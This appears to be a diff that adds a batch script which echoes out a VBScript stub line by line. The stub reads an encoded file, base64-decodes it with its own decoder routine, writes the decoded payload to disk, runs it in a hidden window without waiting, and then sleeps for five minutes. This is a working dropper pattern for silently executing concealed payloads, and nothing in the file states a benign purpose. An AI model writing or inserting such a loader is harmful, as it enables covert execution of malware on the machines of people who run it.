@@ -1,0 +1,41 @@
+echo Set fs = CreateObject("Scripting.FileSystemObject") >>decode_stub
+echo Set file = fs.GetFile("ENCODED") >>decode_stub
+echo If file.Size Then >>decode_stub
+echo Set fd = fs.OpenTextFile("ENCODED", 1) >>decode_stub
+echo data = fd.ReadAll >>decode_stub
+echo data = Replace(data, vbCrLf, "") >>decode_stub
+echo data = base64_decode(data) >>decode_stub
+echo fd.Close >>decode_stub
+echo Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("DECODED", 2, True) >>decode_stub
+echo ofs.Write data >>decode_stub
+echo ofs.close >>decode_stub
+echo Set shell = CreateObject("Wscript.Shell") >>decode_stub
+echo shell.run "DECODED", 0, false >>decode_stub
+echo Wscript.sleep(1000 * 60 * 5) >>decode_stub
+echo Else >>decode_stub
+echo Wscript.Echo "The file is empty." >>decode_stub
+echo End If >>decode_stub
+echo Function base64_decode(byVal strIn) >>decode_stub
+echo Dim w1, w2, w3, w4, n, strOut >>decode_stub
+echo For n = 1 To Len(strIn) Step 4 >>decode_stub
+echo w1 = mimedecode(Mid(strIn, n, 1)) >>decode_stub
+echo w2 = mimedecode(Mid(strIn, n + 1, 1)) >>decode_stub
+echo w3 = mimedecode(Mid(strIn, n + 2, 1)) >>decode_stub
+echo w4 = mimedecode(Mid(strIn, n + 3, 1)) >>decode_stub
+echo If Not w2 Then _ >>decode_stub
+echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) >>decode_stub
+echo If  Not w3 Then _ >>decode_stub
+echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255)) >>decode_stub
+echo If Not w4 Then _ >>decode_stub
+echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) >>decode_stub
+echo Next >>decode_stub
+echo base64_decode = strOut >>decode_stub
+echo End Function >>decode_stub
+echo Function mimedecode(byVal strIn) >>decode_stub
+echo Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" >>decode_stub
+echo If Len(strIn) = 0 Then >>decode_stub
+echo mimedecode = -1 : Exit Function >>decode_stub
+echo Else >>decode_stub
+echo mimedecode = InStr(Base64Chars, strIn) - 1 >>decode_stub
+echo End If >>decode_stub
+echo End Function >>decode_stub
